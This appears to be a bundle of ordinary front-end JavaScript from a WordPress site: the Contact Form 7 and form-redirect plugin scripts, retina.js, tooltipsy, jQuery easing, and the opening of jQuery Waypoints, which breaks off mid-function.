// source --> https://kendrew.ca/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.1.1
(function($) {

    'use strict';

    if (typeof wpcf7 === 'undefined' || wpcf7 === null) {
        return;
    }

    wpcf7 = $.extend({
        cached: 0,
        inputs: []
    }, wpcf7);

    $(function() {
        wpcf7.supportHtml5 = (function() {
            var features = {};
            var input = document.createElement('input');

            features.placeholder = 'placeholder' in input;

            var inputTypes = ['email', 'url', 'tel', 'number', 'range', 'date'];

            $.each(inputTypes, function(index, value) {
                input.setAttribute('type', value);
                features[value] = input.type !== 'text';
            });

            return features;
        })();

        $('div.wpcf7 > form').each(function() {
            var $form = $(this);
            wpcf7.initForm($form);

            if (wpcf7.cached) {
                wpcf7.refill($form);
            }
        });
    });

    wpcf7.getId = function(form) {
        return parseInt($('input[name="_wpcf7"]', form).val(), 10);
    };

    wpcf7.initForm = function(form) {
        var $form = $(form);

        $form.submit(function(event) {
            if (!wpcf7.supportHtml5.placeholder) {
                $('[placeholder].placeheld', $form).each(function(i, n) {
                    $(n).val('').removeClass('placeheld');
                });
            }

            if (typeof window.FormData === 'function') {
                wpcf7.submit($form);
                event.preventDefault();
            }
        });

        $('.wpcf7-submit', $form).after('<span class="ajax-loader"></span>');

        wpcf7.toggleSubmit($form);

        $form.on('click', '.wpcf7-acceptance', function() {
            wpcf7.toggleSubmit($form);
        });

        // Exclusive Checkbox
        $('.wpcf7-exclusive-checkbox', $form).on('click', 'input:checkbox', function() {
            var name = $(this).attr('name');
            $form.find('input:checkbox[name="' + name + '"]').not(this).prop('checked', false);
        });

        // Free Text Option for Checkboxes and Radio Buttons
        $('.wpcf7-list-item.has-free-text', $form).each(function() {
            var $freetext = $(':input.wpcf7-free-text', this);
            var $wrap = $(this).closest('.wpcf7-form-control');

            if ($(':checkbox, :radio', this).is(':checked')) {
                $freetext.prop('disabled', false);
            } else {
                $freetext.prop('disabled', true);
            }

            $wrap.on('change', ':checkbox, :radio', function() {
                var $cb = $('.has-free-text', $wrap).find(':checkbox, :radio');

                if ($cb.is(':checked')) {
                    $freetext.prop('disabled', false).focus();
                } else {
                    $freetext.prop('disabled', true);
                }
            });
        });

        // Placeholder Fallback
        if (!wpcf7.supportHtml5.placeholder) {
            $('[placeholder]', $form).each(function() {
                $(this).val($(this).attr('placeholder'));
                $(this).addClass('placeheld');

                $(this).focus(function() {
                    if ($(this).hasClass('placeheld')) {
                        $(this).val('').removeClass('placeheld');
                    }
                });

                $(this).blur(function() {
                    if ('' === $(this).val()) {
                        $(this).val($(this).attr('placeholder'));
                        $(this).addClass('placeheld');
                    }
                });
            });
        }

        if (wpcf7.jqueryUi && !wpcf7.supportHtml5.date) {
            $form.find('input.wpcf7-date[type="date"]').each(function() {
                $(this).datepicker({
                    dateFormat: 'yy-mm-dd',
                    minDate: new Date($(this).attr('min')),
                    maxDate: new Date($(this).attr('max'))
                });
            });
        }

        if (wpcf7.jqueryUi && !wpcf7.supportHtml5.number) {
            $form.find('input.wpcf7-number[type="number"]').each(function() {
                $(this).spinner({
                    min: $(this).attr('min'),
                    max: $(this).attr('max'),
                    step: $(this).attr('step')
                });
            });
        }

        // Character Count
        $('.wpcf7-character-count', $form).each(function() {
            var $count = $(this);
            var name = $count.attr('data-target-name');
            var down = $count.hasClass('down');
            var starting = parseInt($count.attr('data-starting-value'), 10);
            var maximum = parseInt($count.attr('data-maximum-value'), 10);
            var minimum = parseInt($count.attr('data-minimum-value'), 10);

            var updateCount = function(target) {
                var $target = $(target);
                var length = $target.val().length;
                var count = down ? starting - length : length;
                $count.attr('data-current-value', count);
                $count.text(count);

                if (maximum && maximum < length) {
                    $count.addClass('too-long');
                } else {
                    $count.removeClass('too-long');
                }

                if (minimum && length < minimum) {
                    $count.addClass('too-short');
                } else {
                    $count.removeClass('too-short');
                }
            };

            $(':input[name="' + name + '"]', $form).each(function() {
                updateCount(this);

                $(this).keyup(function() {
                    updateCount(this);
                });
            });
        });

        // URL Input Correction
        $form.on('change', '.wpcf7-validates-as-url', function() {
            var val = $.trim($(this).val());

            if (val && !val.match(/^[a-z][a-z0-9.+-]*:/i) && -1 !== val.indexOf('.')) {
                val = val.replace(/^\/+/, '');
                val = 'http://' + val;
            }

            $(this).val(val);
        });
    };

    wpcf7.submit = function(form) {
        if (typeof window.FormData !== 'function') {
            return;
        }

        var $form = $(form);

        $('.ajax-loader', $form).addClass('is-active');

        wpcf7.clearResponse($form);

        var formData = new FormData($form.get(0));

        var detail = {
            id: $form.closest('div.wpcf7').attr('id'),
            status: 'init',
            inputs: [],
            formData: formData
        };

        $.each($form.serializeArray(), function(i, field) {
            if ('_wpcf7' == field.name) {
                detail.contactFormId = field.value;
            } else if ('_wpcf7_version' == field.name) {
                detail.pluginVersion = field.value;
            } else if ('_wpcf7_locale' == field.name) {
                detail.contactFormLocale = field.value;
            } else if ('_wpcf7_unit_tag' == field.name) {
                detail.unitTag = field.value;
            } else if ('_wpcf7_container_post' == field.name) {
                detail.containerPostId = field.value;
            } else if (field.name.match(/^_wpcf7_\w+_free_text_/)) {
                var owner = field.name.replace(/^_wpcf7_\w+_free_text_/, '');
                detail.inputs.push({
                    name: owner + '-free-text',
                    value: field.value
                });
            } else if (field.name.match(/^_/)) {
                // do nothing
            } else {
                detail.inputs.push(field);
            }
        });

        wpcf7.triggerEvent($form.closest('div.wpcf7'), 'beforesubmit', detail);

        var ajaxSuccess = function(data, status, xhr, $form) {
            detail.id = $(data.into).attr('id');
            detail.status = data.status;
            detail.apiResponse = data;

            var $message = $('.wpcf7-response-output', $form);

            switch (data.status) {
                case 'validation_failed':
                    $.each(data.invalidFields, function(i, n) {
                        $(n.into, $form).each(function() {
                            wpcf7.notValidTip(this, n.message);
                            $('.wpcf7-form-control', this).addClass('wpcf7-not-valid');
                            $('[aria-invalid]', this).attr('aria-invalid', 'true');
                        });
                    });

                    $message.addClass('wpcf7-validation-errors');
                    $form.addClass('invalid');

                    wpcf7.triggerEvent(data.into, 'invalid', detail);
                    break;
                case 'acceptance_missing':
                    $message.addClass('wpcf7-acceptance-missing');
                    $form.addClass('unaccepted');

                    wpcf7.triggerEvent(data.into, 'unaccepted', detail);
                    break;
                case 'spam':
                    $message.addClass('wpcf7-spam-blocked');
                    $form.addClass('spam');

                    wpcf7.triggerEvent(data.into, 'spam', detail);
                    break;
                case 'aborted':
                    $message.addClass('wpcf7-aborted');
                    $form.addClass('aborted');

                    wpcf7.triggerEvent(data.into, 'aborted', detail);
                    break;
                case 'mail_sent':
                    $message.addClass('wpcf7-mail-sent-ok');
                    $form.addClass('sent');

                    wpcf7.triggerEvent(data.into, 'mailsent', detail);
                    break;
                case 'mail_failed':
                    $message.addClass('wpcf7-mail-sent-ng');
                    $form.addClass('failed');

                    wpcf7.triggerEvent(data.into, 'mailfailed', detail);
                    break;
                default:
                    var customStatusClass = 'custom-' + data.status.replace(/[^0-9a-z]+/i, '-');
                    $message.addClass('wpcf7-' + customStatusClass);
                    $form.addClass(customStatusClass);
            }

            wpcf7.refill($form, data);

            wpcf7.triggerEvent(data.into, 'submit', detail);

            if ('mail_sent' == data.status) {
                $form.each(function() {
                    this.reset();
                });

                wpcf7.toggleSubmit($form);
            }

            if (!wpcf7.supportHtml5.placeholder) {
                $form.find('[placeholder].placeheld').each(function(i, n) {
                    $(n).val($(n).attr('placeholder'));
                });
            }

            $message.html('').append(data.message).slideDown('fast');
            $message.attr('role', 'alert');

            $('.screen-reader-response', $form.closest('.wpcf7')).each(function() {
                var $response = $(this);
                $response.html('').attr('role', '').append(data.message);

                if (data.invalidFields) {
                    var $invalids = $('<ul></ul>');

                    $.each(data.invalidFields, function(i, n) {
                        if (n.idref) {
                            var $li = $('<li></li>').append($('<a></a>').attr('href', '#' + n.idref).append(n.message));
                        } else {
                            var $li = $('<li></li>').append(n.message);
                        }

                        $invalids.append($li);
                    });

                    $response.append($invalids);
                }

                $response.attr('role', 'alert').focus();
            });
        };

        $.ajax({
            type: 'POST',
            url: wpcf7.apiSettings.getRoute(
                '/contact-forms/' + wpcf7.getId($form) + '/feedback'),
            data: formData,
            dataType: 'json',
            processData: false,
            contentType: false
        }).done(function(data, status, xhr) {
            ajaxSuccess(data, status, xhr, $form);
            $('.ajax-loader', $form).removeClass('is-active');
        }).fail(function(xhr, status, error) {
            var $e = $('<div class="ajax-error"></div>').text(error.message);
            $form.after($e);
        });
    };

    wpcf7.triggerEvent = function(target, name, detail) {
        var $target = $(target);

        /* DOM event */
        var event = new CustomEvent('wpcf7' + name, {
            bubbles: true,
            detail: detail
        });

        $target.get(0).dispatchEvent(event);

        /* jQuery event */
        $target.trigger('wpcf7:' + name, detail);
        $target.trigger(name + '.wpcf7', detail); // deprecated
    };

    wpcf7.toggleSubmit = function(form, state) {
        var $form = $(form);
        var $submit = $('input:submit', $form);

        if (typeof state !== 'undefined') {
            $submit.prop('disabled', !state);
            return;
        }

        if ($form.hasClass('wpcf7-acceptance-as-validation')) {
            return;
        }

        $submit.prop('disabled', false);

        $('.wpcf7-acceptance', $form).each(function() {
            var $span = $(this);
            var $input = $('input:checkbox', $span);

            if (!$span.hasClass('optional')) {
                if ($span.hasClass('invert') && $input.is(':checked') || !$span.hasClass('invert') && !$input.is(':checked')) {
                    $submit.prop('disabled', true);
                    return false;
                }
            }
        });
    };

    wpcf7.notValidTip = function(target, message) {
        var $target = $(target);
        $('.wpcf7-not-valid-tip', $target).remove();
        $('<span role="alert" class="wpcf7-not-valid-tip"></span>')
            .text(message).appendTo($target);

        if ($target.is('.use-floating-validation-tip *')) {
            var fadeOut = function(target) {
                $(target).not(':hidden').animate({
                    opacity: 0
                }, 'fast', function() {
                    $(this).css({
                        'z-index': -100
                    });
                });
            };

            $target.on('mouseover', '.wpcf7-not-valid-tip', function() {
                fadeOut(this);
            });

            $target.on('focus', ':input', function() {
                fadeOut($('.wpcf7-not-valid-tip', $target));
            });
        }
    };

    wpcf7.refill = function(form, data) {
        var $form = $(form);

        var refillCaptcha = function($form, items) {
            $.each(items, function(i, n) {
                $form.find(':input[name="' + i + '"]').val('');
                $form.find('img.wpcf7-captcha-' + i).attr('src', n);
                var match = /([0-9]+)\.(png|gif|jpeg)$/.exec(n);
                $form.find('input:hidden[name="_wpcf7_captcha_challenge_' + i + '"]').attr('value', match[1]);
            });
        };

        var refillQuiz = function($form, items) {
            $.each(items, function(i, n) {
                $form.find(':input[name="' + i + '"]').val('');
                $form.find(':input[name="' + i + '"]').siblings('span.wpcf7-quiz-label').text(n[0]);
                $form.find('input:hidden[name="_wpcf7_quiz_answer_' + i + '"]').attr('value', n[1]);
            });
        };

        if (typeof data === 'undefined') {
            $.ajax({
                type: 'GET',
                url: wpcf7.apiSettings.getRoute(
                    '/contact-forms/' + wpcf7.getId($form) + '/refill'),
                beforeSend: function(xhr) {
                    var nonce = $form.find(':input[name="_wpnonce"]').val();

                    if (nonce) {
                        xhr.setRequestHeader('X-WP-Nonce', nonce);
                    }
                },
                dataType: 'json'
            }).done(function(data, status, xhr) {
                if (data.captcha) {
                    refillCaptcha($form, data.captcha);
                }

                if (data.quiz) {
                    refillQuiz($form, data.quiz);
                }
            });

        } else {
            if (data.captcha) {
                refillCaptcha($form, data.captcha);
            }

            if (data.quiz) {
                refillQuiz($form, data.quiz);
            }
        }
    };

    wpcf7.clearResponse = function(form) {
        var $form = $(form);
        $form.removeClass('invalid spam sent failed');
        $form.siblings('.screen-reader-response').html('').attr('role', '');

        $('.wpcf7-not-valid-tip', $form).remove();
        $('[aria-invalid]', $form).attr('aria-invalid', 'false');
        $('.wpcf7-form-control', $form).removeClass('wpcf7-not-valid');

        $('.wpcf7-response-output', $form)
            .hide().empty().removeAttr('role')
            .removeClass('wpcf7-mail-sent-ok wpcf7-mail-sent-ng wpcf7-validation-errors wpcf7-spam-blocked');
    };

    wpcf7.apiSettings.getRoute = function(path) {
        var url = wpcf7.apiSettings.root;

        url = url.replace(
            wpcf7.apiSettings.namespace,
            wpcf7.apiSettings.namespace + path);

        return url;
    };

})(jQuery);

/*
 * Polyfill for Internet Explorer
 * See https://developer.mozilla.org/en-US/docs/Web/API/CustomEvent/CustomEvent
 */
(function() {
    if (typeof window.CustomEvent === "function") return false;

    function CustomEvent(event, params) {
        params = params || {
            bubbles: false,
            cancelable: false,
            detail: undefined
        };
        var evt = document.createEvent('CustomEvent');
        evt.initCustomEvent(event,
            params.bubbles, params.cancelable, params.detail);
        return evt;
    }

    CustomEvent.prototype = window.Event.prototype;

    window.CustomEvent = CustomEvent;
})();
// source --> https://kendrew.ca/wp-content/plugins/wpcf7-redirect/js/wpcf7-redirect-script.js
jQuery(document).ready(function() {
    wpcf7_redirect_mailsent_handler();
});

function wpcf7_redirect_mailsent_handler() {
    document.addEventListener('wpcf7mailsent', function(event) {
        form = wpcf7_redirect_forms[event.detail.contactFormId];

        // Script to run after sent.
        if (form.after_sent_script) {
            form.after_sent_script = htmlspecialchars_decode(form.after_sent_script);
            eval(form.after_sent_script);
        }

        // Set redirect URL
        if (form.use_external_url && form.external_url) {
            redirect_url = form.external_url;
        } else {
            redirect_url = form.thankyou_page_url;
        }

        // Build http query
        if (form.http_build_query) {
            http_query = jQuery.param(event.detail.inputs, true);
            redirect_url = redirect_url + '?' + http_query;
        } else if (form.http_build_query_selectively) {
            http_query = '?';
            selective_fields = form.http_build_query_selectively_fields.split(' ').join('');
            event.detail.inputs.forEach(function(element, index) {
                if (selective_fields.indexOf(element.name) != -1) {
                    http_query += element.name + '=' + element.value + '&';
                }
            });

            http_query = http_query.slice(0, -1);
            redirect_url = redirect_url + http_query;
        }

        // Redirect
        if (redirect_url) {
            if (!form.open_in_new_tab) {
                // Open in current tab
                location.href = redirect_url;
            } else {
                // Open in external tab
                window.open(redirect_url);
            }
        }

    }, false);
}

function htmlspecialchars_decode(string) {
    var map = {
        '&amp;': '&',
        '&#038;': "&",
        '&lt;': '<',
        '&gt;': '>',
        '&quot;': '"',
        '&#039;': "'",
        '&#8217;': "â€™",
        '&#8216;': "â€˜",
        '&#8211;': "â€“",
        '&#8212;': "â€”",
        '&#8230;': "â€¦",
        '&#8221;': 'â€'
    };

    return string.replace(/\&[\w\d\#]{2,5}\;/g, function(m) {
        return map[m];
    });
};
// source --> https://kendrew.ca/wp-content/themes/logipro/scripts/logipro-global-plugins.js
/*retina.js v1.1.0*/
;
(function() {
    var root = typeof exports == "undefined" ? window : exports;
    var config = {
        check_mime_type: true
    };
    root.Retina = Retina;

    function Retina() {}
    Retina.configure = function(options) {
        if (options == null) options = {};
        for (var prop in options) config[prop] = options[prop]
    };
    Retina.init = function(context) {
        if (context == null) context = root;
        var existing_onload = context.onload || new Function;
        context.onload = function() {
            var images = document.getElementsByTagName("img"),
                retinaImages = [],
                i, image;
            for (i = 0; i < images.length; i++) {
                image = images[i];
                retinaImages.push(new RetinaImage(image))
            }
            existing_onload()
        }
    };
    Retina.isRetina = function() {
        var mediaQuery = "(-webkit-min-device-pixel-ratio: 1.5),(min--moz-device-pixel-ratio: 1.5),(-o-min-device-pixel-ratio: 3/2),(min-resolution: 1.5dppx)";
        if (root.devicePixelRatio > 1) return true;
        if (root.matchMedia && root.matchMedia(mediaQuery).matches) return true;
        return false
    };
    root.RetinaImagePath = RetinaImagePath;

    function RetinaImagePath(path, at_2x_path) {
        this.path = path;
        if (typeof at_2x_path !== "undefined" && at_2x_path !== null) {
            this.at_2x_path = at_2x_path;
            this.perform_check = false
        } else {
            this.at_2x_path = path.replace(/\.\w+$/, function(match) {
                return "@2x" + match
            });
            this.perform_check = true
        }
    }
    RetinaImagePath.confirmed_paths = [];
    RetinaImagePath.prototype.is_external = function() {
        return !!(this.path.match(/^https?\:/i) && !this.path.match("//" + document.domain))
    };
    RetinaImagePath.prototype.check_2x_variant = function(callback) {
        var http, that = this;
        if (this.is_external()) {
            return callback(false)
        } else if (!this.perform_check && typeof this.at_2x_path !== "undefined" && this.at_2x_path !== null) {
            return callback(true)
        } else if (this.at_2x_path in RetinaImagePath.confirmed_paths) {
            return callback(true)
        } else {
            http = new XMLHttpRequest;
            http.open("HEAD", this.at_2x_path);
            http.onreadystatechange = function() {
                if (http.readyState != 4) {
                    return callback(false)
                }
                if (http.status >= 200 && http.status <= 399) {
                    if (config.check_mime_type) {
                        var type = http.getResponseHeader("Content-Type");
                        if (type == null || !type.match(/^image/i)) {
                            return callback(false)
                        }
                    }
                    RetinaImagePath.confirmed_paths.push(that.at_2x_path);
                    return callback(true)
                } else {
                    return callback(false)
                }
            };
            http.send()
        }
    };

    function RetinaImage(el) {
        this.el = el;
        this.path = new RetinaImagePath(this.el.getAttribute("src"), this.el.getAttribute("data-at2x"));
        var that = this;
        this.path.check_2x_variant(function(hasVariant) {
            if (hasVariant) that.swap()
        })
    }
    root.RetinaImage = RetinaImage;
    RetinaImage.prototype.swap = function(path) {
        if (typeof path == "undefined") path = this.path.at_2x_path;
        var that = this;

        function load() {
            if (!that.el.complete) {
                setTimeout(load, 5)
            } else {
                that.el.setAttribute("width", that.el.naturalWidth);
                that.el.setAttribute("height", that.el.naturalHeight);
                that.el.setAttribute("src", path)
            }
        }
        load()
    };
    if (Retina.isRetina()) {
        Retina.init(root)
    }
})();

/*https://github.com/briancray/tooltipsy*/
;
(function(a) {
    a.tooltipsy = function(c, b) {
        this.options = b;
        this.$el = a(c);
        this.title = this.$el.attr("title") || "";
        this.$el.attr("title", "");
        this.random = parseInt(Math.random() * 10000);
        this.ready = false;
        this.shown = false;
        this.width = 0;
        this.height = 0;
        this.delaytimer = null;
        this.$el.data("tooltipsy", this);
        this.init()
    };
    a.tooltipsy.prototype = {
        init: function() {
            var e = this,
                d, b = e.$el,
                c = b[0];
            e.settings = d = a.extend({}, e.defaults, e.options);
            d.delay = +d.delay;
            if (typeof d.content === "function") {
                e.readify()
            }
            if (d.showEvent === d.hideEvent && d.showEvent === "click") {
                b.toggle(function(f) {
                    if (d.showEvent === "click" && c.tagName == "A") {
                        f.preventDefault()
                    }
                    if (d.delay > 0) {
                        e.delaytimer = window.setTimeout(function() {
                            e.show(f)
                        }, d.delay)
                    } else {
                        e.show(f)
                    }
                }, function(f) {
                    if (d.showEvent === "click" && c.tagName == "A") {
                        f.preventDefault()
                    }
                    window.clearTimeout(e.delaytimer);
                    e.delaytimer = null;
                    e.hide(f)
                })
            } else {
                b.bind(d.showEvent, function(f) {
                    if (d.showEvent === "click" && c.tagName == "A") {
                        f.preventDefault()
                    }
                    e.delaytimer = window.setTimeout(function() {
                        e.show(f)
                    }, d.delay || 0)
                }).bind(d.hideEvent, function(f) {
                    if (d.showEvent === "click" && c.tagName == "A") {
                        f.preventDefault()
                    }
                    window.clearTimeout(e.delaytimer);
                    e.delaytimer = null;
                    e.hide(f)
                })
            }
        },
        show: function(i) {
            if (this.ready === false) {
                this.readify()
            }
            var b = this,
                f = b.settings,
                h = b.$tipsy,
                k = b.$el,
                d = k[0],
                g = b.offset(d);
            if (b.shown === false) {
                if ((function(m) {
                    var l = 0,
                        e;
                    for (e in m) {
                        if (m.hasOwnProperty(e)) {
                            l++
                        }
                    }
                    return l
                })(f.css) > 0) {
                    b.$tip.css(f.css)
                }
                b.width = h.outerWidth();
                b.height = h.outerHeight()
            }
            if (f.alignTo === "cursor" && i) {
                var j = [i.clientX + f.offset[0], i.clientY + f.offset[1]];
                if (j[0] + b.width > a(window).width()) {
                    var c = {
                        top: j[1] + "px",
                        right: j[0] + "px",
                        left: "auto"
                    }
                } else {
                    var c = {
                        top: j[1] + "px",
                        left: j[0] + "px",
                        right: "auto"
                    }
                }
            } else {
                var j = [(function() {
                    if (f.offset[0] < 0) {
                        return g.left - Math.abs(f.offset[0]) - b.width
                    } else {
                        if (f.offset[0] === 0) {
                            return g.left - ((b.width - k.outerWidth()) / 2)
                        } else {
                            return g.left + k.outerWidth() + f.offset[0]
                        }
                    }
                })(), (function() {
                    if (f.offset[1] < 0) {
                        return g.top - Math.abs(f.offset[1]) - b.height
                    } else {
                        if (f.offset[1] === 0) {
                            return g.top - ((b.height - b.$el.outerHeight()) / 2)
                        } else {
                            return g.top + b.$el.outerHeight() + f.offset[1]
                        }
                    }
                })()]
            }
            h.css({
                top: j[1] + "px",
                left: j[0] + "px"
            }).animate({
                top: j[1] + "px"
            }, 200, 'easeInOutExpo');
            b.settings.show(i, h.stop(true, true))
        },
        hide: function(c) {
            var b = this;
            if (b.ready === false) {
                return
            }
            if (c && c.relatedTarget === b.$tip[0]) {
                b.$tip.bind("mouseleave", function(d) {
                    if (d.relatedTarget === b.$el[0]) {
                        return
                    }
                    b.settings.hide(d, b.$tipsy.stop(true, true))
                });
                return
            }
            b.settings.hide(c, b.$tipsy.stop(true, true))
        },
        readify: function() {
            this.ready = true;
            this.$tipsy = a('<div id="tooltipsy' + this.random + '" style="position:fixed;z-index:2147483647;display:none">').appendTo("body");
            this.$tip = a('<div class="' + this.settings.className + '">').appendTo(this.$tipsy);
            this.$tip.data("rootel", this.$el);
            var c = this.$el;
            var b = this.$tip;
            this.$tip.html(this.settings.content != "" ? (typeof this.settings.content == "string" ? this.settings.content : this.settings.content(c, b)) : this.title)
        },
        offset: function(b) {
            return this.$el[0].getBoundingClientRect()
        },
        destroy: function() {
            if (this.$tipsy) {
                this.$tipsy.remove();
                a.removeData(this.$el, "tooltipsy")
            }
        },
        defaults: {
            alignTo: "element",
            offset: [0, -1],
            content: "",
            show: function(c, b) {
                b.fadeIn(100)
            },
            hide: function(c, b) {
                b.fadeOut(100)
            },
            css: {},
            className: "tooltipsy",
            delay: 200,
            showEvent: "mouseenter",
            hideEvent: "mouseleave"
        }
    };
    a.fn.tooltipsy = function(b) {
        return this.each(function() {
            new a.tooltipsy(this, b)
        })
    }
})(jQuery);

/*Please see licensing and creator information at http://gsgd.co.uk/sandbox/jquery/easing/jquery.easing.1.3.js*/
;
jQuery.easing.jswing = jQuery.easing.swing;
jQuery.extend(jQuery.easing, {
    def: "easeOutQuad",
    swing: function(e, f, a, h, g) {
        return jQuery.easing[jQuery.easing.def](e, f, a, h, g)
    },
    easeInQuad: function(e, f, a, h, g) {
        return h * (f /= g) * f + a
    },
    easeOutQuad: function(e, f, a, h, g) {
        return -h * (f /= g) * (f - 2) + a
    },
    easeInOutQuad: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return h / 2 * f * f + a
        }
        return -h / 2 * ((--f) * (f - 2) - 1) + a
    },
    easeInCubic: function(e, f, a, h, g) {
        return h * (f /= g) * f * f + a
    },
    easeOutCubic: function(e, f, a, h, g) {
        return h * ((f = f / g - 1) * f * f + 1) + a
    },
    easeInOutCubic: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return h / 2 * f * f * f + a
        }
        return h / 2 * ((f -= 2) * f * f + 2) + a
    },
    easeInQuart: function(e, f, a, h, g) {
        return h * (f /= g) * f * f * f + a
    },
    easeOutQuart: function(e, f, a, h, g) {
        return -h * ((f = f / g - 1) * f * f * f - 1) + a
    },
    easeInOutQuart: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return h / 2 * f * f * f * f + a
        }
        return -h / 2 * ((f -= 2) * f * f * f - 2) + a
    },
    easeInQuint: function(e, f, a, h, g) {
        return h * (f /= g) * f * f * f * f + a
    },
    easeOutQuint: function(e, f, a, h, g) {
        return h * ((f = f / g - 1) * f * f * f * f + 1) + a
    },
    easeInOutQuint: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return h / 2 * f * f * f * f * f + a
        }
        return h / 2 * ((f -= 2) * f * f * f * f + 2) + a
    },
    easeInSine: function(e, f, a, h, g) {
        return -h * Math.cos(f / g * (Math.PI / 2)) + h + a
    },
    easeOutSine: function(e, f, a, h, g) {
        return h * Math.sin(f / g * (Math.PI / 2)) + a
    },
    easeInOutSine: function(e, f, a, h, g) {
        return -h / 2 * (Math.cos(Math.PI * f / g) - 1) + a
    },
    easeInExpo: function(e, f, a, h, g) {
        return (f == 0) ? a : h * Math.pow(2, 10 * (f / g - 1)) + a
    },
    easeOutExpo: function(e, f, a, h, g) {
        return (f == g) ? a + h : h * (-Math.pow(2, -10 * f / g) + 1) + a
    },
    easeInOutExpo: function(e, f, a, h, g) {
        if (f == 0) {
            return a
        }
        if (f == g) {
            return a + h
        }
        if ((f /= g / 2) < 1) {
            return h / 2 * Math.pow(2, 10 * (f - 1)) + a
        }
        return h / 2 * (-Math.pow(2, -10 * --f) + 2) + a
    },
    easeInCirc: function(e, f, a, h, g) {
        return -h * (Math.sqrt(1 - (f /= g) * f) - 1) + a
    },
    easeOutCirc: function(e, f, a, h, g) {
        return h * Math.sqrt(1 - (f = f / g - 1) * f) + a
    },
    easeInOutCirc: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return -h / 2 * (Math.sqrt(1 - f * f) - 1) + a
        }
        return h / 2 * (Math.sqrt(1 - (f -= 2) * f) + 1) + a
    },
    easeInElastic: function(f, h, e, l, k) {
        var i = 1.70158;
        var j = 0;
        var g = l;
        if (h == 0) {
            return e
        }
        if ((h /= k) == 1) {
            return e + l
        }
        if (!j) {
            j = k * 0.3
        }
        if (g < Math.abs(l)) {
            g = l;
            var i = j / 4
        } else {
            var i = j / (2 * Math.PI) * Math.asin(l / g)
        }
        return -(g * Math.pow(2, 10 * (h -= 1)) * Math.sin((h * k - i) * (2 * Math.PI) / j)) + e
    },
    easeOutElastic: function(f, h, e, l, k) {
        var i = 1.70158;
        var j = 0;
        var g = l;
        if (h == 0) {
            return e
        }
        if ((h /= k) == 1) {
            return e + l
        }
        if (!j) {
            j = k * 0.3
        }
        if (g < Math.abs(l)) {
            g = l;
            var i = j / 4
        } else {
            var i = j / (2 * Math.PI) * Math.asin(l / g)
        }
        return g * Math.pow(2, -10 * h) * Math.sin((h * k - i) * (2 * Math.PI) / j) + l + e
    },
    easeInOutElastic: function(f, h, e, l, k) {
        var i = 1.70158;
        var j = 0;
        var g = l;
        if (h == 0) {
            return e
        }
        if ((h /= k / 2) == 2) {
            return e + l
        }
        if (!j) {
            j = k * (0.3 * 1.5)
        }
        if (g < Math.abs(l)) {
            g = l;
            var i = j / 4
        } else {
            var i = j / (2 * Math.PI) * Math.asin(l / g)
        }
        if (h < 1) {
            return -0.5 * (g * Math.pow(2, 10 * (h -= 1)) * Math.sin((h * k - i) * (2 * Math.PI) / j)) + e
        }
        return g * Math.pow(2, -10 * (h -= 1)) * Math.sin((h * k - i) * (2 * Math.PI) / j) * 0.5 + l + e
    },
    easeInBack: function(e, f, a, i, h, g) {
        if (g == undefined) {
            g = 1.70158
        }
        return i * (f /= h) * f * ((g + 1) * f - g) + a
    },
    easeOutBack: function(e, f, a, i, h, g) {
        if (g == undefined) {
            g = 1.70158
        }
        return i * ((f = f / h - 1) * f * ((g + 1) * f + g) + 1) + a
    },
    easeInOutBack: function(e, f, a, i, h, g) {
        if (g == undefined) {
            g = 1.70158
        }
        if ((f /= h / 2) < 1) {
            return i / 2 * (f * f * (((g *= (1.525)) + 1) * f - g)) + a
        }
        return i / 2 * ((f -= 2) * f * (((g *= (1.525)) + 1) * f + g) + 2) + a
    },
    easeInBounce: function(e, f, a, h, g) {
        return h - jQuery.easing.easeOutBounce(e, g - f, 0, h, g) + a
    },
    easeOutBounce: function(e, f, a, h, g) {
        if ((f /= g) < (1 / 2.75)) {
            return h * (7.5625 * f * f) + a
        } else {
            if (f < (2 / 2.75)) {
                return h * (7.5625 * (f -= (1.5 / 2.75)) * f + 0.75) + a
            } else {
                if (f < (2.5 / 2.75)) {
                    return h * (7.5625 * (f -= (2.25 / 2.75)) * f + 0.9375) + a
                } else {
                    return h * (7.5625 * (f -= (2.625 / 2.75)) * f + 0.984375) + a
                }
            }
        }
    },
    easeInOutBounce: function(e, f, a, h, g) {
        if (f < g / 2) {
            return jQuery.easing.easeInBounce(e, f * 2, 0, h, g) * 0.5 + a
        }
        return jQuery.easing.easeOutBounce(e, f * 2 - g, 0, h, g) * 0.5 + h * 0.5 + a
    }
});

/*
jQuery Waypoints - v2.0.3
Copyright (c) 2011-2013 Caleb Troughton
Dual licensed under the MIT license and GPL license.
https://github.com/imakewebthings/jquery-waypoints/blob/master/licenses.txt
*/
(function() {
    var t = [].indexOf || function(t) {
            for (var e = 0, n = this.length; e < n; e++) {
                if (e in this && this[e] === t) return e
            }
            return -1
        },
        e = [].slice;
    (function(t, e) {
        if (typeof define === "function" && define.amd) {
            return define("waypoints", ["jquery"], function(n) {
                return e(n, t)
            })
        } else {
            return e(t.jQuery, t)
        }
    })(this, function(n, r) {
        var i, o, l, s, f, u, a, c, h, d, p, y, v, w, g, m;
        i = n(r);
        c = t.call(r, "ontouchstart") >= 0;
        s = {
            horizontal: {},
            vertical: {}
        };
        f = 1;
        a = {};
        u = "waypoints-context-id";
        p = "resize.waypoints";
        y = "scroll.waypoints";
        v = 1;
        w = "waypoints-waypoint-ids";
        g = "waypoint";
        m = "waypoints";
        o = function() {
            function t(t) {
                var e = this;
                this.$element = t;
                this.element = t[0];
                this.didResize = false;
                this.didScroll = false;
                this.id = "context" + f++;
                this.oldScroll = {
                    x: t.scrollLeft(),
                    y: t.scrollTop()
                };
                this.waypoints = {
                    horizontal: {},
                    vertical: {}
                };
                t.data(u, this.id);
                a[this.id] = this;
                t.bind(y, function() {
                    var t;
                    if (!(e.didScroll || c)) {
                        e.didScroll = true;
                        t = function() {
                            e.doScroll();
                            return e.didScroll = false
                        };
                        return r.setTimeout(t, n[m].settings.scrollThrottle)
                    }
                });
                t.bind(p, function() {
                    var t;
                    if (!e.didResize) {
                        e.didResize = true;
                        t = function() {
                            n[m]("refresh");
                            return e.didResize = false
                        };
                        return r.setTimeout(t, n[m].settings.resizeThrottle)
                    }
                })
            }
            t.prototype.doScroll = function() {
